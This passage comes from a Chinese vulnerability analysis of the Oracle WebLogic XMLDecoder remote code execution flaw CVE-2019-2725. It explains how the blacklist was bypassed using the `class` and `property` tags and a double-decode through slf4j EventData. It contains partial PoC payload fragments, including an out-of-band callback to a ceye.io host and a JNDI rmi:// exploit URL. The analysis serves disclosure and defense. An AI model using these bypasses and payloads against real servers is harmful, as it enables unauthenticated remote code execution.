                            }
                            if (var3.equalsIgnoreCase("array")) {
                                String var9 = var4.getValue("class");
                                if (var9 != null && !var9.equalsIgnoreCase("byte")) {
                                    throw new IllegalStateException("The value of class attribute is not valid for array element.");
                                }
                                String var6 = var4.getValue("length");
                                if (var6 != null) {
                                    try {
                                        int var7 = Integer.valueOf(var6);
                                        if (var7 >= WorkContextXmlInputAdapter.MAXARRAYLENGTH) {
                                            throw new IllegalStateException("Exceed array length limitation");
                                        }
                                        this.overallarraylength += var7;
                                        if (this.overallarraylength >= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) {
                                            throw new IllegalStateException("Exceed over all array limitation.");
                                        }
                                    } catch (NumberFormatException var8) {
                                        ;
                                    }
可以看到，`object`，`new`，`method`这些标签都被拦截了，遇到直接抛出错误。`void`标签后面只能跟`index`，`array`标签后面可以跟`class`属性，但是类型只能是`byte`类型的。其中，过滤`object`标签是CVE-2017-3506的补丁，剩下的过滤是针对CVE-2017-10271的补丁。
如果仔细看了黑名单的，就不难发现，外面流传的很多PoC都是假的，就是新url入口+老的payload，这样的组合是没有办法绕过这个黑名单的。
绕过这个黑名单的关键是`class`标签，可以从官方的[文档](https://docs.oracle.com/javase/tutorial/javabeans/advanced/longpersistence.html)来了解一下这个标签。
`class`标签可以表示一个类的实例，也就是说可以使用`class`标签来创建任意类的实例。而`class`标签又不在WebLogic
的黑名单之内，这才是这个漏洞最根本的原因。4月26日，Oracle 发布这个漏洞的补丁，过滤了`class`标签也证实了这点。
既然漏洞的原因是绕过了CVE-2017-10271的黑名单，那么`wls-wsat.war`也是应该受影响的。
测试一下，没有问题。
这说明，CNVD的公告写的影响组件不全，漏洞处置建议也写的不全面，要通过访问策略控制禁止 `/_async/*` 及 `/wls-wsat/*`
路径的URL访问才行，之后我们也同步给了CNVD，CNVD发了[第二次通告](http://www.cnvd.org.cn/webinfo/show/4999)。
### 421
2019年4月21日，准备构造出这个漏洞的检测PoC，能够使用`class`标签来创建类的实例，我首先考虑的是构造`java.net.Socket`，这也引出了一个JDK版本的坑。我测试的是jdk6，参考之前的PoC，可以这么构造
            java.net.Socket
                aaaaabbbbbbbbbbb.wfanwb.ceye.io
                80
ceye成功接收到请求，也说明Socket实例创建成功了。
我把上面的检测PoC在 jdk 7上测试，竟然失败了，一直爆找不到`java.net.Socket`这个类错误，让我一度以为这个漏洞只能在 jdk 6
下面触发，后来仔细对比，发现是换行符的问题，也就是这样写才对。
    java.net.Socketaaaaabbbbbbbbbbb.wfanwb.ceye.io80
不带换行符的在6和7下面都能生成实例。其实这个问题在最早测试 CVE-2018-3191 payload的时候就已经发生过，pyn3rd师傅问我xml
payload是怎么生成的，我说用的拼接，直接`System.out.println`输出的，都带了换行符，我因为当时跑weblogic的jdk是jdk6，所以没有问题，但是
pyn3rd 师傅的环境是 jdk7
的，没测试成功，只觉得是PoC写法不同造成的问题，后来师傅自己解决了，这里也没沟通，埋下了一个大坑，导致我后面踩进去了。
### 422
2019年4月22日，pyn3rd 师傅测试 WebLogic
12.1.3没成功，发现是12的版本没有`oracle.toplink.internal.sessions.UnitOfWorkChangeSet`这个类，所以没办法利用。尝试着构造新的exp，目前的情况是，能够创建类的实例，但是调用不了方法。自然想起`com.sun.rowset.JdbcRowSetImpl`这个类。
            rmi://localhost:1099/Exploit
            true
这个是CVE-2017-10271的一种触发方法。之前的黑名单提过，`void`标签后面只能跟`index`，所以上面这个payload肯定会被黑名单拦截。尝试使用`class`标签重写上面的payload。
构造的过程中，在跟底层代码的时候，发现 jdk 6和 jdk 7处理标签的方式不同。
jdk 6使用的是`com.sun.beans.ObjectHandler`
![
](https://images.seebug.org/content/images/2019/05/43f5d754-fd8c-4de7-b692-defe57ef3161.png-w331s)
能用的有`string`，`class`，`null`，`void`，`array`，`java`，`object`和一些基本类型标签(如int)。
jdk7 使用的是`com.sun.beans.decoder.DocumentHandler`
![
](https://images.seebug.org/content/images/2019/05/fe3f5815-840e-42ab-a862-16ea6b64c83f.png-w331s)
可以看到，和jdk6差异不小，例如，jdk 6不支持`new`，`property`等标签。
我在用jdk 6 的标签构造的时候，一直没构造成功，直到我看到jdk 7 的源码里面的`property`，这不就是我想要的么，而且这个标签还不在
WebLogic 的黑名单内。所以重写上面的payload如下
可以看到，没有触发黑名单，成功的执行了命令，而且没有依赖 WebLogic
内部的包，10.3.6和12.1.3都可以通用。遗憾的是，这个payload的打不了 jdk 6的，因为 jdk 6 不支持
`property`标签。期望有大佬能写出6也能用的。
### 423
2019年4月23日，在CNVD发出通告，各大安全公司发出漏洞预警之后，之前提过的新url+老payload的这种模式的PoC和exp纷纷出炉。不仅是国内，国外也很热闹，很多人表示测试成功，但是都是在无补丁的情况下测试的。Oracle
官网下载的 WebLogic 都是没有安装补丁的，Oracle的补丁是单独收费的，如果安装了 CVE-2017-10271
的补丁，这些PoC和exp都是没有办法触发的，绕过不了黑名单。
### 426
2019年4月26日，Oracle 官方发布紧急补丁，并为该漏洞分配编号CVE-2019-2725。
### 427
2019年4月27日，pyn3rd 师傅说12.1.3版本的exp也有人弄出来了，用的是`org.slf4j.ext.EventData`
        public EventData(String xml) {
            ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes());
            try {
                XMLDecoder decoder = new XMLDecoder(bais);
                this.eventData = (Map)decoder.readObject();
            } catch (Exception var4) {
                throw new EventException("Error decoding " + xml, var4);
            }
        }
看下这个类的构造方法，直接将传入的xml交给XMLdecoder处理，太粗暴了...
相当于经过了两次XMLdecode，所以外层用``绕过，内层直接标记为纯文本，绕过第一次过滤，第二次 XMLdecode不经过WebLogic
黑名单，直接被JDK解析反序列化执行。
这种exp也是最完美的，没有jdk版本限制，不需要外连，可惜的是只能打12.1.3版本。
### 430
2019年4月30日，在其他大佬手中看到了这个漏洞的其他利用方式，没有 weblogic和
jdk的版本限制，比上面的几种利用方式都更完善。这种利用方式我之前也看到过，就是Tenable
发的[演示视频](https://www.youtube.com/watch?v=lePLlC1hFrU&feature=youtu.be)，当时没想明白，看了大佬的利用方式之后，才明白自己忽略了什么。构造方式可以参考CVE-2017-17485，我之前构造exp的时候也没有往这方面想，这或许就是黑哥说的积累不够吧。
### 总结
  * 针对这次漏洞，Oracle 也是打破了常规更新，在漏洞预警后不久就发布了补丁，仍然是使用黑名单的方式修复。(吐槽一下，这么修复，这个功能还能用么？)
  * 此次的漏洞事件中，也看到了安全圈的乱象，漏洞都没有经过完全的验证，就直接发错误的分析文章和假PoC，误导大众。
  * 在这个漏洞应急的过程中，从无到有，从缺到圆，踩了很多坑，也学习到了很多姿势，也看到了自己和大佬的差距。最后感谢漏洞应急过程中几位师傅的交流和指点。
### 参考链接
  * [关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告](http://www.cnvd.org.cn/webinfo/show/4989)
  * [Weblogic XMLDecoder RCE分析](https://paper.seebug.org/487/)
  * [Oracle Security Alert Advisory - CVE-2019-2725](https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html)
  * [[KnownSec 404 Team] Oracle WebLogic Deserialization RCE Vulnerability (0day) Alert](https://medium.com/@knownseczoomeye/knownsec-404-team-oracle-weblogic-deserialization-rce-vulnerability-0day-alert-90dd9a79ae93)
  * [WebLogic Unauthenticated Remote Code Execution Vulnerability (CVE-2019-2725) with Pocsuite3](https://www.youtube.com/watch?v=NtjC7cheNd8&feature=youtu.be)
* * *